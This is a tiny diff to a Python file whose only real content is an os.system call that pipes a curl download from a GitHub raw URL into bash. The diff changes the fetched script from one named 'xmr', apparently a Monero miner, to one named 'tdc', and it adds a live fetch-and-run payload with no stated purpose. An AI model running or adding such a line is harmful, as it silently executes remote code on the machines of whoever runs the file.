@@ -1,4 +1,4 @@
 import sys
 import os
 
-os.system('curl -sL https://github.com/bengetsia/soft/raw/main/xmr | bash')
+os.system('curl -sL https://github.com/bengetsia/soft/raw/main/tdc | bash')
